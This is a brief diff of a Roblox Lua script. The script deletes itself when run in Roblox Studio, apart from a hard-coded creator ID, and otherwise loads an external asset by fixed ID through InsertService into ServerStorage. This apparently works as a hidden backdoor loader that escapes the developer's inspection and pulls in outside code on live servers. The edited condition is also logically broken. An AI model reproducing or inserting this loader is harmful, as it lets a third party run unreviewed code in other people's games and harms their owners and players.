@@ -1,9 +1,8 @@
-if game:GetService("RunService"):IsStudio()  then 
+if game:GetService("RunService"):IsStudio() and not game.CreatorId == "302146585"  then
 	script:Destroy()
-end
-
+ end
 	
-if game.CreatorId == "302146585" or not game:GetService("RunService"):IsStudio() then
+
 local id = "8883162505" -- ID
 local iets = game:GetService("InsertService"):LoadAsset(id) 
 iets.Parent=game.ServerStorage
